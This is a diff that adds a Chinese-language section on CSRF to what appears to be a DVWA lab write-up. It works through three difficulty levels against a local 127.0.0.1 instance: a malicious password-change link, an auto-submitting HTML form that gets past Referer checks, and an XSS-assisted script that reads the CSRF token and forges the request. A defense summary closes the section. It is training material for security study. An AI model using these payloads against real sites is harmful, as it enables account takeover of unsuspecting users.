@@ -418,3 +418,48 @@ html
 - 若必须调用，使用列表参数形式（如 Python 的 `subprocess.run(["ping", ip])`）或严格转义输入。
 - 使用白名单验证输入格式（如 IP 地址正则）。
 - 运行 Web 服务的进程使用最低权限用户。
+
+
+## CSRF（跨站请求伪造）
+
+### 概述
+CSRF（Cross-Site Request Forgery）利用网站对用户浏览器发起的请求的信任，诱使用户在已登录状态下执行非本意操作（如修改密码、转账等）。
+
+### Low 级别（无防护）
+
+- **防护机制**：无任何 Token 或 Referer 校验，直接使用 GET 参数修改密码。
+- **攻击方式**：构造恶意链接或图片标签。
+- **恶意链接示例**：http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#
+- ![](screenshots/csrf/修改成功.png)
+
+### Medium 级别（Referer 校验）
+- **防护机制**检查 HTTP_REFERER 是否包含服务器域名（如 127.0.0.1）。
+- **绕过方式**
+- 使用 Burp Suite 修改 Referer 头，使其包含目标域名。
+- 将攻击页面部署在目标域名下（如上传到 DVWA 服务器）。
+- 攻击页面示例（部署在 /var/www/html/csrf_medium.html）：
+- <html>
+<body onload="document.forms[0].submit()">
+  <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_new" value="hacked" />
+    <input type="hidden" name="password_conf" value="hacked" />
+    <input type="hidden" name="Change" value="Change" />
+  </form>
+</body>
+</html>
+- 绕过原理：当页面位于 127.0.0.1 下时，浏览器发送的 Referer 自动包含 127.0.0.1，通过校验。
+- ![](screenshots/csrf/修改成功.png)
+
+### High 级别（CSRF Token）
+- **防护机制**每个会话生成随机 user_token，提交请求时必须携带正确 Token。
+- **直接攻击**伪造请求因缺少有效 Token 而失败。
+- **绕过方式**需结合 XSS 漏洞，通过 JavaScript 读取当前页面的 Token 并发送请求。
+#### XSS 配合脚本示例：
+var token = document.getElementsByName('user_token')[0].value;
+var url = 'http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=attacker&password_conf=attacker&Change=Change&user_token=' + token;
+new Image().src = url;
+- **防御总结**
+- 使用 CSRF Token（每个请求或会话绑定）。
+- 设置 SameSite Cookie 属性（Lax 或 Strict）。
+- 敏感操作二次验证（原密码、验证码）。
+- 同时防御 XSS，避免 Token 被窃取。
